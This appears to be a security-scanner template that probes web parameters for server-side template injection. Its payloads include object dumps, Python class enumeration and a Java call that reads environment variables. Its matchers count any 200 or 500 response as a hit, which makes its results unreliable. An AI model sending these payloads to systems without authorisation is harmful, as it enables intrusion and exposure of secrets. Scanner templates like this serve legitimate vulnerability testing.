id: generic-ssti
info:
  name: Server-Side Template Injection
  description: Tests for SSTI vulnerabilities in template engines
  owasp_category: A03:2021
  severity: critical
  tags:
    - ssti
    - template
    - rce
    - generic

generic:
  endpoint: "{{all_discovered}}"
  method: GET
  parameter: "{{input_param}}"

  payloads:
    - "{{7*7}}"
    - "${7*7}"
    - "#{7*7}"
    - "<%= 7*7 %>"
    - "${{7*7}}"
    - "{{config}}"
    - "{{self}}"
    - "${config}"
    - "{{request}}"
    - "{{''.class.mro()[1].subclasses()}}"
    - "${T(java.lang.System).getenv()}"
    - "@{{7*7}}"
    - "{{7*'7'}}"
    - "#{ 7 * 7 }"

  matchers:
    - type: word
      words:
        - "49"
        - "config object"
        - "application"
        - "<class 'object'>"
      condition: or
    - type: status
      condition: in
      status:
        - 200
        - 500

  matchers_condition: or
